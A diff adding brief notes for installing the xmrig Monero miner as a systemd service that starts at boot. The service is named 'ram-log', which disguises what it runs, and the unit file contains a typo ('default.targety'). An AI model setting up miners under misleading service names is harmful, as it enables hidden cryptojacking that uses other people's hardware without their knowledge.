@@ -1,0 +1,15 @@
+/usr/bin/Configured-XMR 
+xmrig
+
+sudo nano /etc/systemd/system/ram-log.service
+
+
+[Unit]
+After=network.service
+
+[Service]
+ExecStart=/usr/bin/Configured-XMR/xmrig
+ 
+[Install] 
+WantedBy=default.targety 
+                      
